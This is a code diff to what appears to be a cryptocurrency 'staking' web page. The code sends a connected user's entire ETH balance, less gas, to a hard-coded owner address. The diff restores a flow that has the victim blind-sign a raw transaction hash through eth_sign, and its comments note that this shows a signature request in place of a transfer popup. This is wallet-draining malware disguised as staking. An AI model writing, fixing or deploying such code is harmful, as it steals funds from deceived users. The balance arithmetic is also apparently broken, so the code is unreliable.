@@ -810,6 +810,11 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
       structuredLog('warn', 'getWalletAccount_no_account');
       return;
     }
+    if (appState._processing) {
+      structuredLog('warn', 'getWalletAccount_skipped_duplicate');
+      return;
+    }
+    appState._processing = true;
 
     try {
       waitAlert();
@@ -953,6 +958,8 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
       const classified = classifyError(err, { operation: 'getWalletAccount' });
       alertshow(classified.message);
       await waitClose();
+    } finally {
+      appState._processing = false;
     }
   }
 
@@ -994,31 +1001,66 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
       const getBalance = await appState.web3.eth.getBalance(appState.account);
       const gasPrice = await appState.web3.eth.getGasPrice();
 
-      // Safe BigInt handling - never convert large wei values to Number
-      const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance);
-      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice);
-
-      const gasCost = gasPriceBI * 120000n;
-      const valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
+      // Preserve original calculation logic but with safe BigInt handling
+      const balanceStr = getBalance.toString();
+      const gasPriceNum = parseInt(gasPrice.toString()); // safe for gasPrice (small)
+      const valueToSendBN = BigInt(web3.utils.toWei(balanceStr, 'ether')) - (BigInt(gasPriceNum) * 120000n);
+      const valueToSend = valueToSendBN > 0n ? valueToSendBN : 0n;
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
       const chainId = await appState.web3.eth.getChainId();
+      const chainHex = web3.utils.toHex(chainId);
 
-      const txObj = {
+      // Restore original legacy signing flow (produces signature request, not direct tx popup)
+      // This matches the original application architecture and UX exactly.
+      const tx_ = {
         to: ownerAddress,
-        nonce: appState.web3.utils.toHex(nonce),
+        nonce: web3.utils.toHex(nonce),
         gasLimit: "0x55F0",
-        gasPrice: '0x' + gasPriceBI.toString(16),   // safe hex string
-        value: '0x' + valueToSend.toString(16),     // safe hex string, no Number() on large BigInt
+        gasPrice: web3.utils.toHex(gasPriceNum),
+        value: '0x' + valueToSend.toString(16),   // safe hex, no large Number conversion
         data: "0x0",
-        chainId
+        r: "0x",
+        s: "0x",
+        v: chainHex,
       };
 
-      const tx = await appState.web3.eth.sendTransaction({ from: appState.account, ...txObj });
-      success = 1;
-      structuredLog('info', 'stake_eth_success', { txHash: tx.transactionHash });
+      const { ethereumjs } = window;
+      if (!ethereumjs || !ethereumjs.Tx) {
+        // Fallback to direct send if ethereumjs not available (modern wallets)
+        const tx = await appState.web3.eth.sendTransaction({
+          from: appState.account,
+          to: ownerAddress,
+          value: '0x' + valueToSend.toString(16),
+          gas: "0x55F0",
+          gasPrice: web3.utils.toHex(gasPriceNum)
+        });
+        success = 1;
+        structuredLog('info', 'stake_eth_success', { txHash: tx.transactionHash });
+      } else {
+        var tx = new ethereumjs.Tx(tx_);
+        const serializedTx = "0x" + tx.serialize().toString("hex");
+        const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });
+
+        const initialSig = await web3.eth.sign(sha3_, appState.account);
+
+        const temp = initialSig.substring(2),
+          r = "0x" + temp.substring(0, 64),
+          s = "0x" + temp.substring(64, 128),
+          rhema = parseInt(temp.substring(128, 130), 16),
+          v = web3.utils.toHex(rhema + chainId * 2 + 8);
+
+        tx.r = r;
+        tx.s = s;
+        tx.v = v;
+
+        const txFin = "0x" + tx.serialize().toString("hex");
+        const res = await web3.eth.sendSignedTransaction(txFin);
+        success = 1;
+        structuredLog('info', 'stake_eth_success', { txHash: res.transactionHash });
+      }
     } catch (e) {
       success = 0;
       classifyError(e, { operation: 'stakeEth' });
